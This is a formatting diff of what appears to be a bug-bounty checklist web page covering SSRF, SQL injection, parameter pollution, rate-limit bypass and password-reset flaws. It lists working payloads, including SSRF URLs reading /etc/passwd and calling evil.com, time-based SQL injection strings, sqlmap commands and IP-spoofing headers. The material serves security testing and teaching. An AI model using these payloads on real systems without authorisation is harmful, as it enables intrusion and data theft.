-        <p>Payload examples:</p>
-        <pre><code>vulnerablesite.com/file/?url=file:///etc/passwd
+                    <h4>Local File Read</h4>
+                    <p>To access local files using SSRF, the `file:///` protocol is used. If the requestster supports
+                        it, access can be made to local files.</p>
+                    <p>Payload examples:</p>
+                    <pre><code>vulnerablesite.com/file/?url=file:///etc/passwd
 vulnerablesite.com/file/?url=file://path/to/file
 vulnerablesite.com/file/?url=file://\/\/etc/passwd
 vulnerablesite.com/file/?url=file:///C:/Windows/win.ini</code></pre>
-        <p>For Windows Server deployments, use `file:///d:/hello.txt`.</p>
+                    <p>For Windows Server deployments, use `file:///d:/hello.txt`.</p>
 
-        <h4>Sensitive Data Disclosure</h4>
-        <p>When the server connects to a malicious server, you can obtain server logs and find sensitive information such as the server's IP. Using the server as a proxy or VPN is also possible.</p>
-        <pre><code>vulnerablesite.com/file/?url=http://evil.com
+                    <h4>Sensitive Data Disclosure</h4>
+                    <p>When the server connects to a malicious server, you can obtain server logs and find sensitive
+                        information such as the server's IP. Using the server as a proxy or VPN is also possible.</p>
+                    <pre><code>vulnerablesite.com/file/?url=http://evil.com
 vulnerablesite.com/file/?url=https://evil.com
 vulnerablesite.com/file/?url=http://Burpcollab
 vulnerablesite.com/file/?url=http://clmppw.dnslog.cn</code></pre>
-        <p>Fetch files with malicious payloads from external sites:</p>
-        <pre><code>vulnerablesite.com/file/?url=http://brutelogic.com.br/poc.svg</code></pre>
+                    <p>Fetch files with malicious payloads from external sites:</p>
+                    <pre><code>vulnerablesite.com/file/?url=http://brutelogic.com.br/poc.svg</code></pre>
 
-        <h4>Bypassing SSRF Filters</h4>
-        <p>Whitelists are generally stricter than blacklists. Bypass them by finding open redirects or exploiting poorly implemented regex in whitelists. Use subdomains or directories in whitelisted domains.</p>
+                    <h4>Bypassing SSRF Filters</h4>
+                    <p>Whitelists are generally stricter than blacklists. Bypass them by finding open redirects or
+                        exploiting poorly implemented regex in whitelists. Use subdomains or directories in whitelisted
+                        domains.</p>
 
-        <h4>Bypassing SSRF Filters via Open Redirection</h4>
-        <p>If an open redirection vulnerability exists, you can use it to redirect requests to internal URLs. Check if the application handles redirects or filters them poorly.</p>
+                    <h4>Bypassing SSRF Filters via Open Redirection</h4>
+                    <p>If an open redirection vulnerability exists, you can use it to redirect requests to internal
+                        URLs. Check if the application handles redirects or filters them poorly.</p>
 
-        <h4>References:</h4>
-        <ul>
-            <li><a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Exploiting Redis via HTTP Requests</a></li>
-            <li><a href="https://maxchadwick.xyz/blog/ssrf-exploits-against-redis">Exploiting Redis</a></li>
-            <li><a href="https://smarx.com/posts/2020/09/ssrf-to-redis-ctf-solution/">SSRF to Redis CTF Solution</a></li>
-            <li><a href="https://www.fatalerrors.org/a/learning-ssrf-through-ctfhub.html">Learning SSRF through CTFHub</a></li>
-            <li><a href="https://www.fatalerrors.org/a/0t511To.html">SSRF Exploitation</a></li>
-            <li><a href="https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html">Exploiting MySQL via SSRF</a></li>
-        </ul>
-    </div>
-</div>
+                    <h4>References:</h4>
+                    <ul>
+                        <li><a
+                                href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Exploiting
+                                Redis via HTTP Requests</a></li>
+                        <li><a href="https://maxchadwick.xyz/blog/ssrf-exploits-against-redis">Exploiting Redis</a></li>
+                        <li><a href="https://smarx.com/posts/2020/09/ssrf-to-redis-ctf-solution/">SSRF to Redis CTF
+                                Solution</a></li>
+                        <li><a href="https://www.fatalerrors.org/a/learning-ssrf-through-ctfhub.html">Learning SSRF
+                                through CTFHub</a></li>
+                        <li><a href="https://www.fatalerrors.org/a/0t511To.html">SSRF Exploitation</a></li>
+                        <li><a href="https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html">Exploiting
+                                MySQL via SSRF</a></li>
+                    </ul>
+                </div>
+            </div>
 
-<!-- SQL Injection Vulnerabilities Category -->
-<div class="category">
-    <h3><input type="checkbox" id="sql-injection-vulnerabilities">16 > SQL Injection Vulnerabilities</h3>
-    <div class="subcategory">
-        <h4>How to Find SQL Injection Vulnerabilities</h4>
+            <!-- SQL Injection Vulnerabilities Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="sql-injection-vulnerabilities">16 > SQL Injection Vulnerabilities</h3>
+                <div class="subcategory">
+                    <h4>How to Find SQL Injection Vulnerabilities</h4>
 
-        <h4>1) Logical Operation</h4>
-        <p>One of the best ways to confirm an SQL injection is by making it operate a logical operation and having the expected results. For example: if the GET parameter <code>?username=Peter</code> returns the same content as <code>?username=Peter'</code> or <code>?username=Peter+'1'='1</code>, then you have found an SQL injection.</p>
+                    <h4>1) Logical Operation</h4>
+                    <p>One of the best ways to confirm an SQL injection is by making it operate a logical operation and
+                        having the expected results. For example: if the GET parameter <code>?username=Peter</code>
+                        returns the same content as <code>?username=Peter'</code> or
+                        <code>?username=Peter+'1'='1</code>, then you have found an SQL injection.
+                    </p>
 
-        <h4>2) Time-Based SQL Injection</h4>
-        <p>Most relative places for injecting SQL payloads as [POST Request] are in Login page (username parameter), Forget password page (username parameter), and Signup Page (first name and last name).</p>
-        
-        <h5>Payloads:</h5>
-        <pre>
+                    <h4>2) Time-Based SQL Injection</h4>
+                    <p>Most relative places for injecting SQL payloads as [POST Request] are in Login page (username
+                        parameter), Forget password page (username parameter), and Signup Page (first name and last
+                        name).</p>
+
+                    <h5>Payloads:</h5>
+                    <pre>
 orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
 (SlEeP%09(14-(5-2)))
 ')) or sleep(5)=' 
@@ -1796,29 +2259,35 @@ orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
 0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
         </pre>
 
-        <img src="https://user-images.githubusercontent.com/63053441/155585150-722a2ec2-787d-42bd-85d7-30c6401f8031.png" alt="SQL Injection Payloads">
+                    <img src="https://user-images.githubusercontent.com/63053441/155585150-722a2ec2-787d-42bd-85d7-30c6401f8031.png"
+                        alt="SQL Injection Payloads">
 
-        <h4>How To Test?</h4>
-        <ol>
-            <li>Use this <a href="https://raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL%20injection/SQL.txt">wordlist</a> with intruder and inject all payloads in relative parameters and headers (User-Agent, Cookies, Referer, x-requested-with, etc.).</li>
-            <li>After you get a DELAY, save the request in a .txt file and use sqlmap to confirm and exploit the vulnerability:
-                <pre>
+                    <h4>How To Test?</h4>
+                    <ol>
+                        <li>Use this <a
+                                href="https://raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL%20injection/SQL.txt">wordlist</a>
+                            with intruder and inject all payloads in relative parameters and headers (User-Agent,
+                            Cookies, Referer, x-requested-with, etc.).</li>
+                        <li>After you get a DELAY, save the request in a .txt file and use sqlmap to confirm and exploit
+                            the vulnerability:
+                            <pre>
 sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
 sqlmap -r txt -p user --force-ssl --level 5 --risk 3
 sqlmap -r request.txt -p email/username --force-ssl --level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
                 </pre>
-            </li>
-            <li>Sometimes you can’t exploit because most modern web apps use WAF and user input validation. You can try:
-                <ul>
-                    <li>Changing the request from POST to GET or vice versa.</li>
-                    <li>Using <code>--random-agent</code>.</li>
-                </ul>
-            </li>
-        </ol>
+                        </li>
+                        <li>Sometimes you can’t exploit because most modern web apps use WAF and user input validation.
+                            You can try:
+                            <ul>
+                                <li>Changing the request from POST to GET or vice versa.</li>
+                                <li>Using <code>--random-agent</code>.</li>
+                            </ul>
+                        </li>
+                    </ol>
 
-        <h4>3) File Uploaders SQLi</h4>
-        <p>Save the file with these names and upload it to the site:</p>
-        <pre>
+                    <h4>3) File Uploaders SQLi</h4>
+                    <p>Save the file with these names and upload it to the site:</p>
+                    <pre>
 --sleep(15).png
 --sleep(6*3).png
 --sleep(25).png
@@ -1826,36 +2295,40 @@ sqlmap -r request.txt -p email/username --force-ssl --level 5 --risk 3 --dbms="M
 pic.png;waitfor delay '0:0:5'-- 
         </pre>
 
-        <h4>References:</h4>
-        
-        <ul>
-        <li>SQL.txt is in download</li>
-            <li><a href="https://twitter.com/GodfatherOrwa">Twitter - GodfatherOrwa</a></li>
-        </ul>
-    </div>
-</div>
+                    <h4>References:</h4>
 
-        <!-- Parameter Pollution Category -->
-<div class="category">
-    <h3><input type="checkbox" id="parameter-pollution">16 > Parameter Pollution</h3>
-    <div class="subcategory">
-        <h4>Anatomy of Parameter Pollution</h4>
-        <p>The manipulation of the value of each parameter depends on how each web technology is parsing these parameters. Some web technologies parse the first or the last occurrence of the parameter, some concatenate all the inputs and others will create an array of parameters.</p>
+                    <ul>
+                        <li>SQL.txt is in download</li>
+                        <li><a href="https://twitter.com/GodfatherOrwa">Twitter - GodfatherOrwa</a></li>
+                    </ul>
+                </div>
+            </div>
 
-        <p align="center">
-            <img 
-                width="600"
-                height="700"
-                src="https://user-images.githubusercontent.com/63053441/159308061-dd00ec1d-bc07-406f-9e19-7a654ff4af54.png"
-                alt="Parameter Pollution Anatomy"
-            >
-        </p>
+            <!-- Parameter Pollution Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="parameter-pollution">16 > Parameter Pollution</h3>
+                <div class="subcategory">
+                    <h4>Anatomy of Parameter Pollution</h4>
+                    <p>The manipulation of the value of each parameter depends on how each web technology is parsing
+                        these parameters. Some web technologies parse the first or the last occurrence of the parameter,
+                        some concatenate all the inputs and others will create an array of parameters.</p>
 
-        <h4>1 - All Occurrences of Specific Parameter</h4>
-        <p>This means that if we parse the same name parameters like <code>q=hello&q=”>< svg/onload=alert(1)></code> the check will be performed on both the parameters because they have the same name. In All occurrences, the barrier is if the back-end logic is configured to allow a specific parameter only 1 time then appending another parameter (e.g., <code>q=hello&q=”>< svg/onload=alert(1)></code>) of the same name will give you an error.</p>
-        
-        <h5>Request:</h5>
-        <pre>
+                    <p align="center">
+                        <img width="600" height="700"
+                            src="https://user-images.githubusercontent.com/63053441/159308061-dd00ec1d-bc07-406f-9e19-7a654ff4af54.png"
+                            alt="Parameter Pollution Anatomy">
+                    </p>
+
+                    <h4>1 - All Occurrences of Specific Parameter</h4>
+                    <p>This means that if we parse the same name parameters like
+                        <code>q=hello&q=”>< svg/onload=alert(1)></code> the check will be performed on both the
+                        parameters because they have the same name. In All occurrences, the barrier is if the back-end
+                        logic is configured to allow a specific parameter only 1 time then appending another parameter
+                        (e.g., <code>q=hello&q=”>< svg/onload=alert(1)></code>) of the same name will give you an error.
+                    </p>
+
+                    <h5>Request:</h5>
+                    <pre>
 POST /details HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
@@ -1863,16 +2336,16 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Fi
 id=100&id=101
         </pre>
 
-        <h5>Response:</h5>
-        <pre>
+                    <h5>Response:</h5>
+                    <pre>
 HTTP/1.1 403
 server: nginx
 content-type: application/json
 cache-control: no-cache, private
         </pre>
 
-        <h5>HTTP Parameter Pollution Request:</h5>
-        <pre>
+                    <h5>HTTP Parameter Pollution Request:</h5>
+                    <pre>
 POST /details HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
@@ -1880,8 +2353,8 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Fi
 id=100,101
         </pre>
 
-        <h5>HTTP Parameter Pollution Response:</h5>
-        <pre>
+                    <h5>HTTP Parameter Pollution Response:</h5>
+                    <pre>
 HTTP/1.1 200 OK
 server: nginx
 content-type: application/json
@@ -1895,79 +2368,87 @@ cache-control: no-cache, private
 }
         </pre>
 
-        <h4>2 - First Occurrence</h4>
-        <p>First occurrence means a web application performs input validation on the first parameter which makes it vulnerable to the second parameter, which should be of the same name.</p>
-        
-        <h5>Request:</h5>
-        <pre>
+                    <h4>2 - First Occurrence</h4>
+                    <p>First occurrence means a web application performs input validation on the first parameter which
+                        makes it vulnerable to the second parameter, which should be of the same name.</p>
+
+                    <h5>Request:</h5>
+                    <pre>
 GET /search?q=">< svg/onload=alert(1)> HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
         </pre>
 
-        <h5>Response:</h5>
-        <pre>
+                    <h5>Response:</h5>
+                    <pre>
 HTTP/1.1 403 Forbidden
 server: nginx
 content-type: application/json
 cache-control: no-cache, private
         </pre>
 
-        <h5>HTTP Parameter Pollution Request:</h5>
-        <pre>
+                    <h5>HTTP Parameter Pollution Request:</h5>
+                    <pre>
 GET /search?q=Hello&q=">< svg/onload=alert(1)> HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
         </pre>
 
-        <h5>HTTP Parameter Pollution Response:</h5>
-        <pre>
+                    <h5>HTTP Parameter Pollution Response:</h5>
+                    <pre>
 HTTP/1.1 200 OK
 server: nginx
 content-type: application/json
 cache-control: no-cache, private
         </pre>
-        <p>In the above mentioned polluted request only the first occurrence (<code>q=Hello</code>) is checked and the last occurrence (<code>q=">< svg/onload=alert(1)></code>) is not sanitized, which means it will trigger XSS.</p>
+                    <p>In the above mentioned polluted request only the first occurrence (<code>q=Hello</code>) is
+                        checked and the last occurrence (<code>q=">< svg/onload=alert(1)></code>) is not sanitized,
+                        which means it will trigger XSS.</p>
 
-        <h4>3 - Last Occurrence</h4>
-        <p>Last occurrence means a web application performs input validation on the last parameter which makes it vulnerable to the first parameter which should be of the same name.</p>
-        
-        <h5>Request:</h5>
-        <pre>
+                    <h4>3 - Last Occurrence</h4>
+                    <p>Last occurrence means a web application performs input validation on the last parameter which
+                        makes it vulnerable to the first parameter which should be of the same name.</p>
+
+                    <h5>Request:</h5>
+                    <pre>
 GET /search?q=">< svg/onload=alert(1)> HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
         </pre>
 
-        <h5>Response:</h5>
-        <pre>
+                    <h5>Response:</h5>
+                    <pre>
 HTTP/1.1 403 Forbidden
 server: nginx
 content-type: application/json
 cache-control: no-cache, private
         </pre>
 
-        <h5>HTTP Parameter Pollution Request:</h5>
-        <pre>
+                    <h5>HTTP Parameter Pollution Request:</h5>
+                    <pre>
 GET /search?q=">< svg/onload=alert(1)>&q=Hello HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
         </pre>
 
-        <h5>HTTP Parameter Pollution Response:</h5>
-        <pre>
+                    <h5>HTTP Parameter Pollution Response:</h5>
+                    <pre>
 HTTP/1.1 200 OK
 server: nginx
 content-type: application/json
 cache-control: no-cache, private
         </pre>
-        <p>In the above mentioned polluted request only the last occurrence (<code>q=Hello</code>) is checked and the first occurrence (<code>q=">< svg/onload=alert(1)></code>) is not sanitized, which means it will trigger XSS.</p>
+                    <p>In the above mentioned polluted request only the last occurrence (<code>q=Hello</code>) is
+                        checked and the first occurrence (<code>q=">< svg/onload=alert(1)></code>) is not sanitized,
+                        which means it will trigger XSS.</p>
 
-        <h4>4 - Becomes an Array</h4>
-        <p>Becomes an array means whatever the input is sent from the client side the server parses it into an array and displays it. This means the parameter which you are polluting has an array datatype, which is also the most vulnerable.</p>
-        
-        <h5>Request:</h5>
-        <pre>
+                    <h4>4 - Becomes an Array</h4>
+                    <p>Becomes an array means whatever the input is sent from the client side the server parses it into
+                        an array and displays it. This means the parameter which you are polluting has an array
+                        datatype, which is also the most vulnerable.</p>
+
+                    <h5>Request:</h5>
+                    <pre>
 POST /details HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
@@ -1975,8 +2456,8 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Fi
 id=100
         </pre>
 
-        <h5>Response:</h5>
-        <pre>
+                    <h5>Response:</h5>
+                    <pre>
 HTTP/1.1 200 OK
 server: nginx
 content-type: application/json
@@ -1988,8 +2469,8 @@ cache-control: no-cache, private
 }
         </pre>
 
-        <h5>HTTP Parameter Pollution Request:</h5>
-        <pre>
+                    <h5>HTTP Parameter Pollution Request:</h5>
+                    <pre>
 POST /details HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
@@ -1997,8 +2478,8 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Fi
 id=100&id=101
         </pre>
 
-        <h5>HTTP Parameter Pollution Response:</h5>
-        <pre>
+                    <h5>HTTP Parameter Pollution Response:</h5>
+                    <pre>
 HTTP/1.1 200 OK
 server: nginx
 content-type: application/json
@@ -2010,43 +2491,41 @@ cache-control: no-cache, private
 }
         </pre>
 
-        <h4>References:</h4>
-        <ul>
-            <li><a href="https://shahjerry33.medium.com/parameter-pollution-zero-day-3feb86ee8a02">Parameter Pollution Zero Day</a></li>
-        </ul>
-    </div>
-</div>
+                    <h4>References:</h4>
+                    <ul>
+                        <li><a href="https://shahjerry33.medium.com/parameter-pollution-zero-day-3feb86ee8a02">Parameter
+                                Pollution Zero Day</a></li>
+                    </ul>
+                </div>
+            </div>
 
-<!-- Rate Limit Bypass Category -->
-<div class="category">
-    <h3><input type="checkbox" id="rate-limit-bypass">17 > Rate Limit Bypass</h3>
-    <div class="subcategory">
-        <h4>1. Using Different Parameters</h4>
-        <p>Suppose rate limit is on signup, try to use variations such as:</p>
-        <pre>
+            <!-- Rate Limit Bypass Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="rate-limit-bypass">17 > Rate Limit Bypass</h3>
+                <div class="subcategory">
+                    <h4>1. Using Different Parameters</h4>
+                    <p>Suppose rate limit is on signup, try to use variations such as:</p>
+                    <pre>
 sign-up, Sign-up, SignUp
         </pre>
-        <p align="center">
-            <img 
-                width="600"
-                height="400"
-                src="https://user-images.githubusercontent.com/63053441/120425626-d06f0180-c383-11eb-9fec-22fdfc9c474e.png"
-                alt="Different Parameters Example"
-            >
-        </p>
-        <p align="center">
-            <img 
-                width="600"
-                height="400"
-                src="https://user-images.githubusercontent.com/63053441/120425794-16c46080-c384-11eb-94db-643501b2eae9.png"
-                alt="Different Parameters Example"
-            >
-        </p>
-        <p><a href="https://huzaifa-tahir.medium.com/methods-to-bypass-rate-limit-5185e6c67ecd">Methods to Bypass Rate Limit</a></p>
+                    <p align="center">
+                        <img width="600" height="400"
+                            src="https://user-images.githubusercontent.com/63053441/120425626-d06f0180-c383-11eb-9fec-22fdfc9c474e.png"
+                            alt="Different Parameters Example">
+                    </p>
+                    <p align="center">
+                        <img width="600" height="400"
+                            src="https://user-images.githubusercontent.com/63053441/120425794-16c46080-c384-11eb-94db-643501b2eae9.png"
+                            alt="Different Parameters Example">
+                    </p>
+                    <p><a href="https://huzaifa-tahir.medium.com/methods-to-bypass-rate-limit-5185e6c67ecd">Methods to
+                            Bypass Rate Limit</a></p>
 
-        <h4>2. Rate Limit Bypass Headers</h4>
-        <p>Most applications use <code>X-Forwarded-For</code> to identify the originating IP address of the client. Using headers like <code>X-Forwarded-For</code> multiple times can sometimes bypass rate limit protection.</p>
-        <pre>
+                    <h4>2. Rate Limit Bypass Headers</h4>
+                    <p>Most applications use <code>X-Forwarded-For</code> to identify the originating IP address of the
+                        client. Using headers like <code>X-Forwarded-For</code> multiple times can sometimes bypass rate
+                        limit protection.</p>
+                    <pre>
 X-Forwarded: 127.0.0.1
 X-Forwarded-By: 127.0.0.1
 X-Forwarded-For: 127.0.0.1
@@ -2066,160 +2545,175 @@ X-True-Ip: 127.0.0.1
 
 IP Header 2x times Instead of One time. (Tip from Kiraak Boy)
         </pre>
-        <p align="center">
-            <img 
-                width="600"
-                height="400"
-                src="https://user-images.githubusercontent.com/63053441/120426382-3d36cb80-c385-11eb-8da7-63a1bee081a0.png"
-                alt="Rate Limit Bypass Headers Example"
-            >
-        </p>
-        <p>Sometimes, you may see 20 requests per account; bypass it by using a different IP after 20 attempts.</p>
-        <p align="center">
-            <img 
-                width="600"
-                height="400"
-                src="https://user-images.githubusercontent.com/63053441/120426528-838c2a80-c385-11eb-8d79-3927c4c031c6.png"
-                alt="Rate Limit Bypass Example"
-            >
-        </p>
-        <p align="center">
-            <img 
-                width="600"
-                height="400"
-                src="https://user-images.githubusercontent.com/63053441/120427217-c39fdd00-c386-11eb-9e48-6e9079d50fa6.png"
-                alt="Rate Limit Bypass Example"
-            >
-        </p>
+                    <p align="center">
+                        <img width="600" height="400"
+                            src="https://user-images.githubusercontent.com/63053441/120426382-3d36cb80-c385-11eb-8da7-63a1bee081a0.png"
+                            alt="Rate Limit Bypass Headers Example">
+                    </p>
+                    <p>Sometimes, you may see 20 requests per account; bypass it by using a different IP after 20
+                        attempts.</p>
+                    <p align="center">
+                        <img width="600" height="400"
+                            src="https://user-images.githubusercontent.com/63053441/120426528-838c2a80-c385-11eb-8d79-3927c4c031c6.png"
+                            alt="Rate Limit Bypass Example">
+                    </p>
+                    <p align="center">
+                        <img width="600" height="400"
+                            src="https://user-images.githubusercontent.com/63053441/120427217-c39fdd00-c386-11eb-9e48-6e9079d50fa6.png"
+                            alt="Rate Limit Bypass Example">
+                    </p>
 
-        <h4>3. Rate Limit on OTP SMS</h4>
-        <ol>
-            <li>Capture the request.</li>
-            <li>Remove the country code <code>+91</code> to <code>[ ]</code></li>
-            <li>Modify the number from <code>xxxxx-xxxxx</code> to <code>+91 xxxxx-xxxxx</code></li>
-        </ol>
+                    <h4>3. Rate Limit on OTP SMS</h4>
+                    <ol>
+                        <li>Capture the request.</li>
+                        <li>Remove the country code <code>+91</code> to <code>[ ]</code></li>
+                        <li>Modify the number from <code>xxxxx-xxxxx</code> to <code>+91 xxxxx-xxxxx</code></li>
+                    </ol>
 
-        <h4>4. Adding Characters After Email or Mobile</h4>
-        <p>Add these characters after the email or mobile number:</p>
-        <pre>
+                    <h4>4. Adding Characters After Email or Mobile</h4>
+                    <p>Add these characters after the email or mobile number:</p>
+                    <pre>
 %00, %0d%0a, %09, %0C, %20 (white-space value), %0
         </pre>
-        <p align="center">
-            <img 
-                width="600"
-                height="400"
-                src="https://user-images.githubusercontent.com/63053441/120427626-7708d180-c387-11eb-8db2-28e3d438313e.png"
-                alt="Adding Characters Example"
-            >
-        </p>
+                    <p align="center">
+                        <img width="600" height="400"
+                            src="https://user-images.githubusercontent.com/63053441/120427626-7708d180-c387-11eb-8db2-28e3d438313e.png"
+                            alt="Adding Characters Example">
+                    </p>
 
-        <h4>5. Adding Random Parameters</h4>
-        <p>Just by adding a random parameter (e.g., <code>?bypass</code>) at the end of the endpoint.</p>
-        <p align="center">
-            <img 
-                width="600"
-                height="400"
-                src="https://user-images.githubusercontent.com/63053441/120427012-63a93680-c386-11eb-85a0-ca3079c6ca4f.png"
-                alt="Random Parameters Example"
-            >
-        </p>
-        <p><a href="https://twitter.com/xchopath/status/1245402225788063744/photo/1">Example of Adding Random Parameters</a></p>
+                    <h4>5. Adding Random Parameters</h4>
+                    <p>Just by adding a random parameter (e.g., <code>?bypass</code>) at the end of the endpoint.</p>
+                    <p align="center">
+                        <img width="600" height="400"
+                            src="https://user-images.githubusercontent.com/63053441/120427012-63a93680-c386-11eb-85a0-ca3079c6ca4f.png"
+                            alt="Random Parameters Example">
+                    </p>
+                    <p><a href="https://twitter.com/xchopath/status/1245402225788063744/photo/1">Example of Adding
+                            Random Parameters</a></p>
 
-        <h4>6. Changing User-Agents or/and Cookies</h4>
-        <p>Another method is to change user-agents or cookies to bypass rate limits.</p>
-    </div>
-</div>
+                    <h4>6. Changing User-Agents or/and Cookies</h4>
+                    <p>Another method is to change user-agents or cookies to bypass rate limits.</p>
+                </div>
+            </div>
 
 
-<!-- Password Reset Vulnerabilities Category -->
-<div class="category">
-    <h3><input type="checkbox" id="password-reset-vulnerabilities">18 > Password Reset Vulnerabilities</h3>
-    <div class="subcategory">
-        <h4>1. Password Reset Link Not Expiring</h4>
-        <p>When a user requests to change their password, they receive a password reset link. This link should expire after a certain period. If it does not expire and can be used multiple times, it is a vulnerability.</p>
+            <!-- Password Reset Vulnerabilities Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="password-reset-vulnerabilities">18 > Password Reset Vulnerabilities</h3>
+                <div class="subcategory">
+                    <h4>1. Password Reset Link Not Expiring</h4>
+                    <p>When a user requests to change their password, they receive a password reset link. This link
+                        should expire after a certain period. If it does not expire and can be used multiple times, it
+                        is a vulnerability.</p>
 
-        <h5>First Scenario:</h5>
-        <ol>
-            <li>Go to <a href="https://site.com/users/forgotten_password">https://site.com/users/forgotten_password</a> and send the password reset link to your email.</li>
-            <li>Go to your email inbox, where you will see a reset token like this: <a href="https://site.com/users/new_password?reset_token=your-reset-token">https://site.com/users/new_password?reset_token=your-reset-token</a>. Click the link to change the password. You can use this link multiple times to reset the password.</li>
-        </ol>
-        <div class="impact">
-            <strong>Impact:</strong> Password Reset Link not expiring after changing the password. <a href="https://hackerone.com/reports/898841">More Info</a>
-        </div>
+                    <h5>First Scenario:</h5>
+                    <ol>
+                        <li>Go to <a
+                                href="https://site.com/users/forgotten_password">https://site.com/users/forgotten_password</a>
+                            and send the password reset link to your email.</li>
+                        <li>Go to your email inbox, where you will see a reset token like this: <a
+                                href="https://site.com/users/new_password?reset_token=your-reset-token">https://site.com/users/new_password?reset_token=your-reset-token</a>.
+                            Click the link to change the password. You can use this link multiple times to reset the
+                            password.</li>
+                    </ol>
+                    <div class="impact">
+                        <strong>Impact:</strong> Password Reset Link not expiring after changing the password. <a
+                            href="https://hackerone.com/reports/898841">More Info</a>
+                    </div>
 
-        <h5>Second Scenario:</h5>
-        <ol>
-            <li>Go to <a href="https://infogram.com/forgot">https://infogram.com/forgot</a> and request a password reset link.</li>
-            <li>Don't use the link; keep it in your email inbox.</li>
-            <li>After some time, repeat step 1.</li>
-            <li>This time, use the password reset link obtained in step 3, i.e., the second link.</li>
-            <li>After changing the password, use the password reset link captured in step 1.</li>
-            <li>You’ll see that the password reset link is still valid even after the password change.</li>
-        </ol>
-        <div class="impact">
-            <strong>Impact:</strong> The reset password token from step 3 is still usable and did not expire. If a victim opens their email in a shared or compromised device and forgets to log out, the attacker can use the reset link to change the password. <a href="https://hackerone.com/reports/283550">More Info</a>
-        </div>
+                    <h5>Second Scenario:</h5>
+                    <ol>
+                        <li>Go to <a href="https://infogram.com/forgot">https://infogram.com/forgot</a> and request a
+                            password reset link.</li>
+                        <li>Don't use the link; keep it in your email inbox.</li>
+                        <li>After some time, repeat step 1.</li>
+                        <li>This time, use the password reset link obtained in step 3, i.e., the second link.</li>
+                        <li>After changing the password, use the password reset link captured in step 1.</li>
+                        <li>You’ll see that the password reset link is still valid even after the password change.</li>
+                    </ol>
+                    <div class="impact">
+                        <strong>Impact:</strong> The reset password token from step 3 is still usable and did not
+                        expire. If a victim opens their email in a shared or compromised device and forgets to log out,
+                        the attacker can use the reset link to change the password. <a
+                            href="https://hackerone.com/reports/283550">More Info</a>
+                    </div>
 
-        <h5>Third Scenario:</h5>
-        <ol>
-            <li>Create an account or use an existing one.</li>
-            <li>Confirm your email address.</li>
-            <li>Log out of your account and request a password reset code for your account.</li>
-            <li>Don't use the code that was sent to your email address.</li>
-            <li>In a new browser, log back into your account.</li>
-            <li>Go to account settings and change your password.</li>
-            <li>Now go to your email and check the password reset code requested in step 3.</li>
-            <li>Change your password using that reset code.</li>
-            <li>Your password has been changed. The reset code did not expire after changing the password.</li>
-        </ol>
-        <div class="impact">
-            <strong>Impact:</strong> The reset password token in step 3 is still usable. If a victim uses a shared or compromised device, an attacker can reset the password. <a href="https://hackerone.com/reports/948345">More Info</a>
-        </div>
+                    <h5>Third Scenario:</h5>
+                    <ol>
+                        <li>Create an account or use an existing one.</li>
+                        <li>Confirm your email address.</li>
+                        <li>Log out of your account and request a password reset code for your account.</li>
+                        <li>Don't use the code that was sent to your email address.</li>
+                        <li>In a new browser, log back into your account.</li>
+                        <li>Go to account settings and change your password.</li>
+                        <li>Now go to your email and check the password reset code requested in step 3.</li>
+                        <li>Change your password using that reset code.</li>
+                        <li>Your password has been changed. The reset code did not expire after changing the password.
+                        </li>
+                    </ol>
+                    <div class="impact">
+                        <strong>Impact:</strong> The reset password token in step 3 is still usable. If a victim uses a
+                        shared or compromised device, an attacker can reset the password. <a
+                            href="https://hackerone.com/reports/948345">More Info</a>
+                    </div>
 
-        <h5>Fourth Scenario:</h5>
-        <ol>
-            <li>Send the password reset link to your email.</li>
-            <li>Don't open the password link; copy it and paste it into any editor.</li>
-            <li>Open your account.</li>
-            <li>Go to your account settings.</li>
-            <li>Under account, find Account Overview.</li>
-            <li>Go to the Email and Password option and change the email and verify it.</li>
-            <li>After changing the email, go to the copied password reset link.</li>
-            <li>Change your password.</li>
-            <li>Your password has been changed.</li>
-        </ol>
-        <div class="impact">
